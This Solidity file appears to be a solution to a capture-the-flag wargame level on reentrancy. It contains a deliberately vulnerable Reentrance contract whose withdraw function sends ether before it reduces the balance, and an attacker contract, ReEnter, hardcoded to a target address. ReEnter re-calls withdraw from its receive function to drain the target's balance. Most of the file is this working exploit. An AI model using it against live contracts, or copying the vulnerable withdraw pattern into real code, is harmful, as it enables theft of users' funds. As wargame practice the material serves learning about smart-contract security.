// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}('');
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReEnter {
    Reentrance public original = Reentrance(payable(0x9CB10868A571a3e3a0d39122256E151D48021176));
    uint256 public amount = 100000000 gwei;

    constructor() payable {} // TODO how can I seed this contract when deploying with hardhat?

    function donateToSelf() public {
        original.donate{value: amount}(address(this)); //need to add value to this fn
    }

    receive() external payable {
        if (address(original).balance != 0) {
            original.withdraw(amount);
        }
    }
}
